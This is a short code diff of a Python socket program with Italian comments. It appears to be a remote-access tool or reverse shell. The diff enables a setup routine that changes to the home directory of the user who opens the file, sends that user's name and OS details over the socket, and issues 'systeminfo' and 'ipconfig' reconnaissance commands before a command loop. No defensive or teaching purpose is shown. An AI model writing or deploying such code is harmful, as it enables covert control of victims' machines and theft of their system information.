@@ -20,6 +20,8 @@ def connect():
 
     return serverSocket, connectionSocket
 
+
+
 def setup_windows(connectionSocket):
     connectionSocket.send("systeminfo".encode(encoding='latin-1'))
     connectionSocket.send("ipconfig".encode(encoding='latin-1'))
@@ -45,26 +47,26 @@ def setup(connectionSocket):
     os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
                         #dell'utente che apre il file)
 
-    connectionSocket.send(sys.encode(encoding='latin-1'))
+    connectionSocket.send(sys.__str__().encode(encoding='latin-1'))
     connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))
 
-    #if sys.sysname == "Windows":
-  #      setup_windows(connectionSocket)
+    if sys.sysname == "Windows":
+       setup_windows(connectionSocket)
 
-    #if sys.sysname == 'Linux': #aggiungere Mac
-   
-   #     setup_Linux(connectionSocket)
+    if sys.sysname == 'Linux': #aggiungere Mac
+        setup_Linux(connectionSocket)
+
+    connectionSocket.send('esc'.encode(encoding='latin-1'))
 
     
-
-
-
 
 def main():
     
     serverSocket, connectionSocket = connect()
 
-   # setup(connectionSocket)
+    setup(connectionSocket)
+
+    result = ''
 
     while True:
         try:
